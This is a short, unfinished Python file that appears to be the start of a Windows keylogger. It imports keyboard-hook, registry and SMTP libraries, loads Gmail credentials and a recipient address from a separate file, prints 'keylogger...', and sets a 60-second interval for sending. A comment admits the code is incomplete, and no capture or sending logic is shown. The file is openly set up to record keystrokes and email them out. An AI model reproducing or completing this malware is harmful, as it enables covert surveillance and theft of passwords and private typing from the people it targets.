import sys
import pythoncom , win32api
import pyWinhook as pyHook
import os,time,random,smtplib, base64
from winreg import *

from winregistry import *
from file1 import PASSWORD,GMAIL,SENDTO

# we got everything we need , but code is still uncomplete

print("keylogger...")

global t,start_times,pics_names,yourgmail,yourgmailpass,sendto,interval

yourgmail = GMAIL
yourgmailpass = PASSWORD
sendto = SENDTO
interval =60

